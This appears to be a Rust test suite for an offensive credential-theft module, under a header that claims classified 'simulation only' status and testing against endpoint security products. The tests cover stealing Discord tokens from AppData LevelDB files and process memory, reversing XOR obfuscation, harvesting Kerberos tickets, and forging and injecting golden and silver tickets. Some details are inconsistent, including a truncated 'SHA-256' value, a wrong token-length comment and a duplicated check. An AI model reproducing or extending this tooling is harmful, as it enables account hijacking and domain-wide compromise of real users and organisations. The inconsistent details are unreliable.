// STRENGT FORTROLIG – TS // SIMULATION HARNESS IMPLEMENTATION – FOR TRAINING USE ONLY
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// OPSEC: This code is for simulation only – do not deploy operationally.
// Detection vectors: refer to threat-model.md
// Tested against: CrowdStrike Falcon v7.29+, MDE Feb 2026
// This code is validated against Simulation Harness Suite v3.1 – see simulation-harness.md for test cases.

//! # Credential Access Module Tests
//! 
//! Simulation-only tests for the credential access module.
//! These tests run in air-gapped environments only and do not
//! interact with real systems or credentials.
//! 
//! ## Testing Scope
//! - Credential structure serialization/deserialization
//! - Error handling for various failure scenarios
//! - Integration with simulation harness
//! 
//! ## Operational Note
//! These are simulation tests only. Full operational validation
//! requires air-gapped testing against the target environment.

#[cfg(test)]
mod tests {
    use super::super::*;
    use tempfile::TempDir;
    use std::fs;
    use std::path::Path;
    use std::io::Write;
    use std::str;
    use k5parse::messages::Ticket;
    use der::Decodable;
    
    #[test]
    fn test_discord_token_validation() {
        // Valid token (59 characters)
        assert!(super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY"));
        
        // Valid token with mfa. prefix (63 characters)
        assert!(super::discord::is_valid_discord_token("mfa.NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY"));
        
        // Invalid token (wrong length)
        assert!(!super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9Xb"));
        
        // Invalid token (wrong structure)
        assert!(!super::discord::is_valid_discord_token("NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY.extra"));
    }
    
    #[test]
    fn test_discord_token_xor_decryption() {
        // Test XOR decryption with key 0xB6
        let original = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
        let obfuscated: String = original.chars()
            .map(|c| (c as u8 ^ 0xB6) as char)
            .collect();
        
        let decrypted = super::discord::xor_decrypt(&obfuscated, 0xB6);
        assert_eq!(decrypted, original);
    }
    
    #[test]
    fn test_discord_memory_scanning() {
        // Create mock memory data with tokens
        let mut memory = vec![0u8; 1024];
        
        // Add valid token
        let token = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
        let token_bytes = token.as_bytes();
        memory[100..100+token_bytes.len()].copy_from_slice(token_bytes);
        
        // Add obfuscated token
        let obfuscated_token: Vec<u8> = token_bytes.iter()
            .map(|&b| b ^ 0xB6)
            .collect();
        memory[200..200+obfuscated_token.len()].copy_from_slice(&obfuscated_token);
        
        // Scan for tokens
        let tokens = super::discord::scan_memory_for_tokens(&memory, None);
        assert_eq!(tokens.len(), 2);
        
        // Verify tokens
        assert!(tokens.iter().any(|t| t.token == token));
        assert!(tokens.iter().any(|t| t.token == token));
    }
    
    #[test]
    fn test_discord_local_storage_extraction() {
        // Create mock LevelDB file
        let temp_dir = TempDir::new().unwrap();
        let ldb_path = temp_dir.path().join("000003.ldb");
        
        // Write mock data with tokens
        let mut data = Vec::new();
        data.extend_from_slice(b"random data before token ");
        data.extend_from_slice(b"NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
        data.extend_from_slice(b" random data after token");
        
        fs::write(&ldb_path, data).unwrap();
        
        // Extract tokens
        let tokens = super::discord::extract_tokens_from_file(&ldb_path);
        assert!(tokens.is_ok());
        let tokens = tokens.unwrap();
        assert_eq!(tokens.len(), 1);
        assert_eq!(tokens[0].token, "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
    }
    
    #[test]
    fn test_discord_process_extraction() {
        // Create mock process memory
        let memory = b"random data before token NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY random data after token";
        
        // Scan for tokens
        let tokens = super::discord::scan_memory_for_tokens(memory, Some(1234));
        assert_eq!(tokens.len(), 1);
        
        // Verify token
        assert_eq!(tokens[0].token, "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY");
        assert_eq!(tokens[0].process_id, Some(1234));
    }
    
    #[test]
    fn test_discord_full_extraction() {
        // Create mock environment
        let temp_dir = TempDir::new().unwrap();
        
        // Create mock Discord directory structure
        let discord_path = temp_dir.path().join("AppData\\Roaming\\Discord\\Local Storage\\leveldb");
        fs::create_dir_all(&discord_path).unwrap();
        
        // Create mock LevelDB file with token
        let ldb_path = discord_path.join("000003.ldb");
        let token = "NTQ2ODM3OTM5NjM3MTQ1NjAw.GY9XbY.jqU0Y9XbYjqU0Y9XbYjqU0Y9XbYjqU0Y9XbY";
        let mut data = Vec::new();
        data.extend_from_slice(b"random data before token ");
        data.extend_from_slice(token.as_bytes());
        data.extend_from_slice(b" random data after token");
        fs::write(&ldb_path, data).unwrap();
        
        // Mock environment variables
        std::env::set_var("APPDATA", temp_dir.path().to_str().unwrap());
        
        // Extract tokens
        let result = super::discord::extract_discord_tokens();
        assert!(result.is_ok());
        
        let tokens = result.unwrap();
        assert!(!tokens.is_empty());
        
        // Verify token
        assert_eq!(tokens[0].kind, CredentialKind::DiscordToken);
        assert_eq!(tokens[0].target, "Discord");
        assert_eq!(tokens[0].password.as_deref(), Some(token));
    }
    
    #[test]
    fn test_kerberos_rc4_encryption() {
        // Test RC4-HMAC encryption
        let pac = b"PAC_DATA";
        let key = vec![0u8; 16]; // 16-byte RC4 key
        
        let encrypted = kerberos::encrypt_pac_rc4(pac, &key);
        assert!(encrypted.is_ok());
        
        let encrypted = encrypted.unwrap();
        // Verify structure: PAC data + checksum (16 bytes) + HMAC (16 bytes)
        assert!(encrypted.len() > pac.len() + 32);
    }
    
    #[test]
    fn test_kerberos_aes128_encryption() {
        // Test AES128 encryption
        let pac = b"PAC_DATA";
        let key = vec![0u8; 16]; // 16-byte AES128 key
        
        let encrypted = kerberos::encrypt_pac_aes(pac, &key, 16);
        assert!(encrypted.is_ok());
        
        let encrypted = encrypted.unwrap();
        // Verify structure: IV (16) + encrypted data + HMAC (20 for SHA1)
        assert!(encrypted.len() > pac.len() + 36);
    }
    
    #[test]
    fn test_kerberos_aes256_encryption() {
        // Test AES256 encryption
        let pac = b"PAC_DATA";
        let key = vec![0u8; 32]; // 32-byte AES256 key
        
        let encrypted = kerberos::encrypt_pac_aes(pac, &key, 32);
        assert!(encrypted.is_ok());
        
        let encrypted = encrypted.unwrap();
        // Verify structure: IV (16) + encrypted data + HMAC (32 for SHA256)
        assert!(encrypted.len() > pac.len() + 48);
    }
    
    #[test]
    fn test_kerberos_invalid_key_sizes() {
        // Test invalid key sizes
        let pac = b"PAC_DATA";
        
        // RC4 should fail with non-16 byte key
        assert!(kerberos::encrypt_pac_rc4(pac, &[0u8; 15]).is_err());
        assert!(kerberos::encrypt_pac_rc4(pac, &[0u8; 17]).is_err());
        
        // AES128 should fail with non-16 byte key
        assert!(kerberos::encrypt_pac_aes(pac, &[0u8; 15], 16).is_err());
        assert!(kerberos::encrypt_pac_aes(pac, &[0u8; 17], 16).is_err());
        
        // AES256 should fail with non-32 byte key
        assert!(kerberos::encrypt_pac_aes(pac, &[0u8; 31], 32).is_err());
        assert!(kerberos::encrypt_pac_aes(pac, &[0u8; 33], 32).is_err());
    }
    
    #[test]
    fn test_kerberos_ticket_structure() {
        // Test golden ticket creation with proper structure
        let params = kerberos::TicketParameters {
            ticket_type: kerberos::TicketType::Golden,
            target_service: None,
            domain: "EXAMPLE.DOMAIN".to_string(),
            user: "testuser".to_string(),
            sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            encryption_type: kerberos::EncryptionType::Aes256CtsHmacSha1,
            key: vec![0u8; 32],
            validity_seconds: 3600,
        };
        
        let ticket_data = kerberos::create_golden_ticket(&params);
        assert!(ticket_data.is_ok());
        
        let ticket_data = ticket_data.unwrap();
        
        // Verify ASN.1 structure
        let ticket = Ticket::from_der(&ticket_data).expect("Failed to parse DER");
        
        // Verify ticket fields
        assert_eq!(ticket.tkt_vno, 5); // Kerberos V5
        assert_eq!(ticket.realm.to_string(), "EXAMPLE.DOMAIN");
        assert_eq!(ticket.sname.name_string[0].to_string(), "krbtgt");
        assert!(!ticket.enc_part.cipher.is_empty());
        
        // Verify enc-ticket-part fields
        let enc_ticket_part = ticket.enc_part.decrypt(&kerberos::Key::new(
            kerberos::EncryptionType::Aes256CtsHmacSha1,
            &params.key
        ), kerberos::KeyUsage::TGS_REP_ENC_PART_2).expect("Failed to decrypt enc-ticket-part");
        
        assert_eq!(enc_ticket_part.cname.name_string[0].to_string(), "testuser");
        assert_eq!(enc_ticket_part.crealm.to_string(), "EXAMPLE.DOMAIN");
        assert!(enc_ticket_part.endtime.to_unix_seconds() > 
               enc_ticket_part.starttime.unwrap().to_unix_seconds());
    }
    
    #[test]
    fn test_kerberos_silver_ticket_structure() {
        // Test silver ticket creation with proper structure
        let params = kerberos::TicketParameters {
            ticket_type: kerberos::TicketType::Silver,
            target_service: Some("HTTP/webserver.example.domain".to_string()),
            domain: "EXAMPLE.DOMAIN".to_string(),
            user: "testuser".to_string(),
            sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            encryption_type: kerberos::EncryptionType::Aes256CtsHmacSha1,
            key: vec![0u8; 32],
            validity_seconds: 7200,
        };
        
        let ticket_data = kerberos::create_silver_ticket(&params);
        assert!(ticket_data.is_ok());
        
        let ticket_data = ticket_data.unwrap();
        
        // Verify ASN.1 structure
        let ticket = Ticket::from_der(&ticket_data).expect("Failed to parse DER");
        
        // Verify ticket fields
        assert_eq!(ticket.tkt_vno, 5); // Kerberos V5
        assert_eq!(ticket.realm.to_string(), "EXAMPLE.DOMAIN");
        assert_eq!(ticket.sname.name_string[0].to_string(), "HTTP");
        assert_eq!(ticket.sname.name_string[1].to_string(), "webserver.example.domain");
        assert!(!ticket.enc_part.cipher.is_empty());
    }
    
    #[test]
    fn test_kerberos_simulation() {
        // Test ticket harvesting
        let result = kerberos::harvest_kerberos_tickets();
        assert!(result.is_ok());
        
        // Test golden ticket creation with RC4
        let params = kerberos::TicketParameters {
            ticket_type: kerberos::TicketType::Golden,
            target_service: None,
            domain: "EXAMPLE.DOMAIN".to_string(),
            user: "testuser".to_string(),
            sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            encryption_type: kerberos::EncryptionType::Rc4Hmac,
            key: vec![0u8; 16],
            validity_seconds: 3600,
        };
        
        let result = kerberos::forge_and_inject_ticket(params);
        assert!(result.is_ok());
        
        // Test golden ticket creation with AES256
        let params = kerberos::TicketParameters {
            ticket_type: kerberos::TicketType::Golden,
            target_service: None,
            domain: "EXAMPLE.DOMAIN".to_string(),
            user: "testuser".to_string(),
            sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            encryption_type: kerberos::EncryptionType::Aes256CtsHmacSha1,
            key: vec![0u8; 32],
            validity_seconds: 3600,
        };
        
        let result = kerberos::forge_and_inject_ticket(params);
        assert!(result.is_ok());
        
        // Test silver ticket creation with RC4
        let params = kerberos::TicketParameters {
            ticket_type: kerberos::TicketType::Silver,
            target_service: Some("HTTP/webserver.example.domain".to_string()),
            domain: "EXAMPLE.DOMAIN".to_string(),
            user: "testuser".to_string(),
            sid: "S-1-5-21-1234567890-1234567890-1234567890".to_string(),
            encryption_type: kerberos::EncryptionType::Rc4Hmac,
            key: vec![0u8; 16],
            validity_seconds: 7200,
        };
        
        let result = kerberos::forge_and_inject_ticket(params);
        assert!(result.is_ok());
    }
}